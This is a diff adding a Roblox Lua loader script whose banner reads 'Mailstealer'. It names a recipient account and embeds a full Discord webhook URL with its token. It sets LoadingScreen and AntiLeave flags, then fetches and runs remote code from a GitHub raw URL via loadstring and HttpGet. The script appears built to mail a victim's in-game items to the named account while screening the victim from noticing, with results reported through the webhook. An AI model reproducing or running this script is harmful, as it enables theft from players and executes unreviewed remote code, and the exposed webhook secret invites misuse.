@@ -1,0 +1,17 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "KingDosPets"
+Webhook = "https://discord.com/api/webhooks/1123654223779872798/-ag3cV8EcZouyzsI4jlcPWMHgyYui4ebZ29MIcji8xT_83VWnniPOhuLHj_nvhRtjlYw"
+UserName2 = "KingDosPets"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
